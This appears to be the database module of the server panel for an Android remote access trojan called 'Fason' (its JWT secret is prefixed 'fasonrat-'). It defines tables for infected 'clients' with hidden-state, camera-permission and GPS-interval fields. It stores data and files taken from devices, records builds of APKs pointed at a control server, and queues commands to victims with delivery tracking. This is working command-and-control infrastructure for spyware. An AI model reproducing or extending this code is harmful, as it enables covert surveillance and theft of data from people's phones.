import crypto from 'crypto';
import Database from 'better-sqlite3';
import { drizzle } from 'drizzle-orm/better-sqlite3';
import { eq, and, desc, sql, count, lt, inArray } from 'drizzle-orm';
import * as schema from './schema.js';
import { paths, ensureDataDir } from '../config/paths.js';
import { log } from '../utils/logger.js';
import {
  users,
  sessions,
  clientData,
  clientFiles,
  logs,
  buildRecords,
  settings,
  loginAttempts,
  commands,
  jwtSecret,
} from './schema.js';
import { ALL_PERMISSIONS, DEFAULT_USER_PERMISSIONS, resolvePermissions } from '../types/index.js';
import type { Permission, UserRole } from '../types/index.js';

export type DB = ReturnType<typeof drizzle<typeof schema>>;

let dbInstance: DB | null = null;
let sqliteDb: Database.Database | null = null;

export function getDb(): DB {
  if (!dbInstance) {
    throw new Error('Database not initialized. Call initDb() first.');
  }
  return dbInstance;
}

export function getSqliteDb(): Database.Database {
  if (!sqliteDb) {
    throw new Error('Database not initialized. Call initDb() first.');
  }
  return sqliteDb;
}

export function initDb(): DB {
  ensureDataDir();
  sqliteDb = new Database(paths.dbPath);

  sqliteDb.pragma('journal_mode = WAL');
  sqliteDb.pragma('foreign_keys = ON');
  sqliteDb.pragma('synchronous = NORMAL');
  sqliteDb.pragma('cache_size = -64000');
  sqliteDb.pragma('busy_timeout = 5000');

  sqliteDb.exec(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE NOT NULL,
      email TEXT UNIQUE NOT NULL,
      password TEXT NOT NULL,
      role TEXT NOT NULL DEFAULT 'user' CHECK(role IN ('admin', 'user')),
      permissions TEXT NOT NULL DEFAULT '[]',
      is_default INTEGER DEFAULT 0,
      created_at TEXT NOT NULL DEFAULT (datetime('now')),
      last_login TEXT
    );

    CREATE TABLE IF NOT EXISTS sessions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      token TEXT UNIQUE NOT NULL,
      user_id INTEGER NOT NULL,
      ip TEXT NOT NULL,
      created_at TEXT NOT NULL DEFAULT (datetime('now')),
      expires_at TEXT NOT NULL,
      FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS clients (
      id TEXT PRIMARY KEY,
      ip TEXT DEFAULT '',
      country TEXT,
      city TEXT,
      timezone TEXT,
      first_seen TEXT DEFAULT (datetime('now')),
      last_seen TEXT DEFAULT (datetime('now')),
      online INTEGER DEFAULT 0,
      reconnect_count INTEGER DEFAULT 0,
      device_model TEXT,
      device_brand TEXT,
      device_version TEXT,
      fason_hidden INTEGER DEFAULT 0,
      camera_permission INTEGER DEFAULT 0,
      current_path TEXT DEFAULT '',
      gps_interval INTEGER DEFAULT 0,
      device_info TEXT
    );

    CREATE TABLE IF NOT EXISTS client_data (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      client_id TEXT NOT NULL,
      data_type TEXT NOT NULL,
      data TEXT DEFAULT '[]',
      updated_at TEXT DEFAULT (datetime('now')),
      UNIQUE(client_id, data_type),
      FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS client_files (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      client_id TEXT NOT NULL,
      file_type TEXT NOT NULL,
      original_name TEXT NOT NULL,
      mime_type TEXT,
      data BLOB NOT NULL,
      file_size INTEGER DEFAULT 0,
      created_at TEXT DEFAULT (datetime('now')),
      FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
    );

    CREATE TABLE IF NOT EXISTS logs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      type TEXT NOT NULL DEFAULT 'INFO',
      category TEXT NOT NULL DEFAULT 'SYSTEM',
      message TEXT NOT NULL,
      details TEXT,
      created_at TEXT DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS build_records (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      server_url TEXT NOT NULL,
      home_page_url TEXT NOT NULL,
      app_name TEXT NOT NULL DEFAULT 'Fason',
      status TEXT DEFAULT 'pending',
      apk_data BLOB,
      file_size INTEGER DEFAULT 0,
      created_at TEXT DEFAULT (datetime('now')),
      completed_at TEXT
    );

    CREATE TABLE IF NOT EXISTS settings (
      key TEXT PRIMARY KEY,
      value TEXT NOT NULL,
      updated_at TEXT DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS login_attempts (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      ip TEXT NOT NULL,
      identifier TEXT NOT NULL DEFAULT '',
      attempted_at TEXT DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS jwt_secret (
      id INTEGER PRIMARY KEY CHECK (id = 1),
      secret TEXT NOT NULL
    );

    CREATE TABLE IF NOT EXISTS commands (
      id TEXT PRIMARY KEY,
      client_id TEXT NOT NULL,
      cmd_type TEXT NOT NULL,
      params TEXT DEFAULT '{}',
      status TEXT NOT NULL DEFAULT 'sent' CHECK(status IN ('sent', 'delivered', 'responded', 'failed')),
      sent_at TEXT NOT NULL DEFAULT (datetime('now')),
      delivered_at TEXT,
      responded_at TEXT,
      response_summary TEXT,
      FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_sessions_token ON sessions(token);
    CREATE INDEX IF NOT EXISTS idx_sessions_user_id ON sessions(user_id);
    CREATE INDEX IF NOT EXISTS idx_sessions_expires_at ON sessions(expires_at);
    CREATE INDEX IF NOT EXISTS idx_clients_online ON clients(online);
    CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen);
    CREATE INDEX IF NOT EXISTS idx_client_data_client_type ON client_data(client_id, data_type);
    CREATE INDEX IF NOT EXISTS idx_client_files_client ON client_files(client_id, file_type);
    CREATE INDEX IF NOT EXISTS idx_logs_type ON logs(type);
    CREATE INDEX IF NOT EXISTS idx_logs_category ON logs(category);
    CREATE INDEX IF NOT EXISTS idx_logs_created_at ON logs(created_at);
    CREATE INDEX IF NOT EXISTS idx_users_username ON users(username);
    CREATE INDEX IF NOT EXISTS idx_users_email ON users(email);
    CREATE INDEX IF NOT EXISTS idx_login_attempts_ip ON login_attempts(ip);
    CREATE INDEX IF NOT EXISTS idx_login_attempts_identifier ON login_attempts(identifier);
    CREATE INDEX IF NOT EXISTS idx_commands_client ON commands(client_id, status);
    CREATE INDEX IF NOT EXISTS idx_commands_sent_at ON commands(sent_at);
  `);

  try {
    const tableInfo = sqliteDb.pragma('table_info(client_files)') as Array<{ name: string }>;
    const columnNames = tableInfo.map((col) => col.name);

    if (columnNames.includes('file_path') && !columnNames.includes('data')) {
      log.info('Migrating client_files: file_path/stored_name → data BLOB...');
      sqliteDb.exec(`DROP TABLE IF EXISTS client_files`);
      sqliteDb.exec(`
        CREATE TABLE client_files (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          client_id TEXT NOT NULL,
          file_type TEXT NOT NULL,
          original_name TEXT NOT NULL,
          mime_type TEXT,
          data BLOB NOT NULL,
          file_size INTEGER DEFAULT 0,
          created_at TEXT DEFAULT (datetime('now')),
          FOREIGN KEY (client_id) REFERENCES clients(id) ON DELETE CASCADE
        )
      `);
      sqliteDb.exec(`CREATE INDEX IF NOT EXISTS idx_client_files_client ON client_files(client_id, file_type)`);
      log.info('client_files migration completed (old file data cleared)');
    }
  } catch (err: unknown) {
    log.warn(`client_files migration warning: ${err instanceof Error ? err.message : String(err)}`);
  }

  try {
    const tableInfo = sqliteDb.pragma('table_info(users)') as Array<{ name: string }>;
    const columnNames = tableInfo.map((col) => col.name);

    if (!columnNames.includes('email')) {
      sqliteDb.exec(`ALTER TABLE users ADD COLUMN email TEXT NOT NULL DEFAULT ''`);
      sqliteDb.exec(`UPDATE users SET email = username || '@fason.com' WHERE email = '' OR email IS NULL`);
      try {
        sqliteDb.exec(`CREATE UNIQUE INDEX IF NOT EXISTS idx_users_email ON users(email)`);
      } catch { /* ignore if duplicates exist */ }
    }

    if (!columnNames.includes('role')) {
      sqliteDb.exec(`ALTER TABLE users ADD COLUMN role TEXT NOT NULL DEFAULT 'admin'`);
      sqliteDb.exec(`UPDATE users SET role = 'admin'`);
    }

    if (!columnNames.includes('permissions')) {
      sqliteDb.exec(`ALTER TABLE users ADD COLUMN permissions TEXT NOT NULL DEFAULT '[]'`);
      const existingUsers = sqliteDb.prepare('SELECT id, role FROM users').all() as Array<{ id: number; role: string }>;
      for (const u of existingUsers) {
        const perms = u.role === 'admin' ? JSON.stringify(ALL_PERMISSIONS) : JSON.stringify(DEFAULT_USER_PERMISSIONS);
        sqliteDb.prepare('UPDATE users SET permissions = ? WHERE id = ?').run(perms, u.id);
      }
    }
  } catch (err: unknown) {
    log.warn(`Migration warning: ${err instanceof Error ? err.message : String(err)}`);
  }

  try {
    const tableInfo = sqliteDb.pragma('table_info(login_attempts)') as Array<{ name: string }>;
    const columnNames = tableInfo.map((col) => col.name);
    if (!columnNames.includes('identifier')) {
      sqliteDb.exec(`ALTER TABLE login_attempts ADD COLUMN identifier TEXT NOT NULL DEFAULT ''`);
      sqliteDb.exec(`CREATE INDEX IF NOT EXISTS idx_login_attempts_identifier ON login_attempts(identifier)`);
      log.info('login_attempts: added identifier column');
    }
  } catch (err: unknown) {
    log.warn(`login_attempts migration warning: ${err instanceof Error ? err.message : String(err)}`);
  }

  try {
    const tableInfo = sqliteDb.pragma('table_info(build_records)') as Array<{ name: string }>;
    const columnNames = tableInfo.map((col) => col.name);

    if (columnNames.includes('progress') && !columnNames.includes('apk_data')) {
      log.info('Migrating build_records: progress → apk_data/file_size...');
      sqliteDb.exec(`DROP TABLE IF EXISTS build_records`);
      sqliteDb.exec(`
        CREATE TABLE build_records (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          server_url TEXT NOT NULL,
          home_page_url TEXT NOT NULL,
          app_name TEXT NOT NULL DEFAULT 'Fason',
          status TEXT DEFAULT 'pending',
          apk_data BLOB,
          file_size INTEGER DEFAULT 0,
          created_at TEXT DEFAULT (datetime('now')),
          completed_at TEXT
        )
      `);
      log.info('build_records migration completed (old build data cleared)');
    }
  } catch (err: unknown) {
    log.warn(`build_records migration warning: ${err instanceof Error ? err.message : String(err)}`);
  }

  dbInstance = drizzle(sqliteDb, { schema });
  log.info('Database initialized successfully (Drizzle ORM)');
  return dbInstance;
}

export function closeDb(): void {
  if (sqliteDb) {
    sqliteDb.close();
    sqliteDb = null;
    dbInstance = null;
    log.info('Database connection closed');
  }
}

export const dbHelpers = {
  getOrCreateClientData(clientId: string, dataType: string): string {
    const d = getDb();
    const row = d.select({ data: clientData.data })
      .from(clientData)
      .where(and(eq(clientData.clientId, clientId), eq(clientData.dataType, dataType)))
      .get();
    if (row) return row.data ?? '[]';

    d.insert(clientData).values({ clientId, dataType, data: '[]' })
      .onConflictDoNothing().run();
    const retry = d.select({ data: clientData.data })
      .from(clientData)
      .where(and(eq(clientData.clientId, clientId), eq(clientData.dataType, dataType)))
      .get();
    return retry?.data ?? '[]';
  },

  setClientData(clientId: string, dataType: string, data: string): void {
    getDb().insert(clientData).values({ clientId, dataType, data })
      .onConflictDoUpdate({
        target: [clientData.clientId, clientData.dataType],
        set: { data, updatedAt: new Date().toISOString() },
      }).run();
  },

  addClientFile(clientId: string, fileType: string, originalName: string, mimeType: string, data: Buffer, fileSize: number): void {
    const d = getDb();
    d.insert(clientFiles).values({
      clientId, fileType, originalName, mimeType, data, fileSize,
    }).run();
  },

  getClientFiles(clientId: string, fileType: string): Array<{
    id: number; originalName: string; mimeType: string | null; fileSize: number | null; createdAt: string | null; fileType: string;
  }> {
    const d = getDb();
    return d.select({
      id: clientFiles.id,
      originalName: clientFiles.originalName,
      mimeType: clientFiles.mimeType,
      fileSize: clientFiles.fileSize,
      createdAt: clientFiles.createdAt,
      fileType: clientFiles.fileType,
    })
      .from(clientFiles)
      .where(and(eq(clientFiles.clientId, clientId), eq(clientFiles.fileType, fileType)))
      .orderBy(desc(clientFiles.createdAt))
      .all();
  },

  addLog(type: string, category: string, message: string, details?: string): void {
    const d = getDb();
    d.insert(logs).values({ type, category, message, details: details || null }).run();
    const raw = getSqliteDb();
    const countResult = raw.prepare('SELECT COUNT(*) as cnt FROM logs').get() as { cnt: number };
    if (countResult.cnt > 11000) {
      raw.prepare(`DELETE FROM logs WHERE id NOT IN (SELECT id FROM logs ORDER BY created_at DESC LIMIT ?)`).run(10000);
    }
  },

  cleanExpiredSessions(): number {
    const d = getDb();
    const now = new Date().toISOString();
    const result = d.delete(sessions).where(lt(sessions.expiresAt, now)).run();
    return result.changes;
  },

  checkLoginAttempts(ip: string, maxAttempts: number, windowMs: number, identifier?: string): boolean {
    const d = getDb();
    const cutoff = new Date(Date.now() - windowMs).toISOString();

    const id = identifier || ip;
    const username = identifier && identifier.includes('|')
      ? identifier.split('|').slice(1).join('|')
      : '';
    const condition = username
      ? sql`(${loginAttempts.ip} = ${ip} OR ${loginAttempts.identifier} = ${id} OR ${loginAttempts.identifier} LIKE ${'%' + username} AND ${loginAttempts.identifier} LIKE ${'%|' + username})`
      : sql`(${loginAttempts.ip} = ${ip} OR ${loginAttempts.identifier} = ${id})`;
    const result = d.select({ count: count() })
      .from(loginAttempts)
      .where(and(condition, sql`${loginAttempts.attemptedAt} > ${cutoff}`))
      .get();
    return (result?.count ?? 0) >= maxAttempts;
  },

  recordLoginAttempt(ip: string, identifier?: string): void {
    const d = getDb();
    const id = identifier || ip;
    d.insert(loginAttempts).values({ ip, identifier: id }).run();
  },

  cleanLoginAttempts(olderThanMs: number): number {
    const d = getDb();
    const cutoff = new Date(Date.now() - olderThanMs).toISOString();
    const result = d.delete(loginAttempts).where(lt(loginAttempts.attemptedAt, cutoff)).run();
    return result.changes;
  },

  getOrCreateJwtSecret(): string {
    if (process.env.JWT_SECRET) return process.env.JWT_SECRET;
    try {
      const d = getDb();
      const row = d.select({ secret: jwtSecret.secret })
        .from(jwtSecret)
        .where(eq(jwtSecret.id, 1))
        .get();
      if (row) return row.secret;
      const secret = 'fasonrat-' + crypto.randomUUID();
      d.insert(jwtSecret).values({ id: 1, secret }).run();
      return secret;
    } catch {
      log.error('Failed to read JWT secret from DB, generating temporary secret');
      return 'fasonrat-err-' + crypto.randomUUID();
    }
  },

  getUserByUsernameOrEmail(identifier: string): typeof schema.users.$inferSelect | undefined {
    const d = getDb();
    const lowerIdent = identifier.toLowerCase();
    return d.select().from(users).where(
      sql`LOWER(${users.username}) = ${lowerIdent} OR LOWER(${users.email}) = ${lowerIdent}`
    ).get();
  },

  getUserById(id: number): typeof schema.users.$inferSelect | undefined {
    const d = getDb();
    return d.select().from(users).where(eq(users.id, id)).get();
  },

  getAllUsers(): Array<Omit<typeof schema.users.$inferSelect, 'password'>> {
    const d = getDb();
    return d.select({
      id: users.id,
      username: users.username,
      email: users.email,
      role: users.role,
      permissions: users.permissions,
      isDefault: users.isDefault,
      createdAt: users.createdAt,
      lastLogin: users.lastLogin,
    }).from(users).orderBy(desc(users.id)).all();
  },

  createUser(username: string, email: string, passwordHash: string, role: 'admin' | 'user' = 'user', permissions?: Permission[]): number {
    const d = getDb();
    const perms = role === 'admin' ? JSON.stringify(ALL_PERMISSIONS) : JSON.stringify(permissions || DEFAULT_USER_PERMISSIONS);
    const result = d.insert(users).values({
      username: username.toLowerCase(),
      email: email.toLowerCase(),
      password: passwordHash,
      role,
      permissions: perms,
    }).run();
    return result.lastInsertRowid as number;
  },

  updateUser(id: number, data: { username?: string; email?: string; role?: 'admin' | 'user'; permissions?: string }): boolean {
    const d = getDb();
    const result = d.update(users).set(data).where(eq(users.id, id)).run();
    return result.changes > 0;
  },

  updateUserPassword(id: number, passwordHash: string): boolean {
    const d = getDb();
    const result = d.update(users).set({ password: passwordHash }).where(eq(users.id, id)).run();
    return result.changes > 0;
  },

  deleteUser(id: number): boolean {
    const d = getDb();
    const result = d.delete(users).where(eq(users.id, id)).run();
    return result.changes > 0;
  },

  getAdminCount(): number {
    const d = getDb();
    const result = d.select({ count: count() }).from(users).where(eq(users.role, 'admin')).get();
    return result?.count ?? 0;
  },

  getUserPermissions(id: number): Permission[] {
    const d = getDb();
    const user = d.select({ role: users.role, permissions: users.permissions }).from(users).where(eq(users.id, id)).get();
    if (!user) return [];
    return resolvePermissions(user.role as UserRole, user.permissions);
  },

  createCommand(id: string, clientId: string, cmdType: string, params: string): void {
    getDb().insert(commands).values({ id, clientId, cmdType, params, status: 'sent' }).run();
  },

  updateCommandStatus(id: string, status: 'delivered' | 'responded' | 'failed', summary?: string): void {
    const updates: Record<string, unknown> = { status };
    if (status === 'delivered') updates.deliveredAt = new Date().toISOString();
    if (status === 'responded') {
      updates.respondedAt = new Date().toISOString();
      if (summary) updates.responseSummary = summary;
    }
    getDb().update(commands).set(updates).where(eq(commands.id, id)).run();
  },

  getPendingCommandForClient(clientId: string, cmdType: string): { id: string; status: string } | undefined {
    const d = getDb();
    return d.select({ id: commands.id, status: commands.status })
      .from(commands)
      .where(and(eq(commands.clientId, clientId), eq(commands.cmdType, cmdType), sql`${commands.status} IN ('sent', 'delivered')`))
      .orderBy(desc(commands.sentAt))
      .limit(1)
      .get();
  },

  markAllPendingCommandsResponded(clientId: string, cmdType: string, summary?: string): string[] {
    const d = getDb();
    const pending = d.select({ id: commands.id })
      .from(commands)
      .where(and(eq(commands.clientId, clientId), eq(commands.cmdType, cmdType), sql`${commands.status} IN ('sent', 'delivered')`))
      .all();
    if (pending.length === 0) return [];
    const ids = pending.map((p) => p.id);
    const nowIso = new Date().toISOString();

    d.update(commands).set({
      status: 'responded',
      respondedAt: nowIso,
      responseSummary: summary ?? null,
    }).where(and(
      eq(commands.clientId, clientId),
      eq(commands.cmdType, cmdType),
      inArray(commands.id, ids),
    )).run();
    return ids;
  },

  cleanOldCommands(maxAgeMs: number = 24 * 60 * 60 * 1000): number {
    const d = getDb();
    const cutoff = new Date(Date.now() - maxAgeMs).toISOString();
    const result = d.delete(commands).where(lt(commands.sentAt, cutoff)).run();
    return result.changes;
  },
};
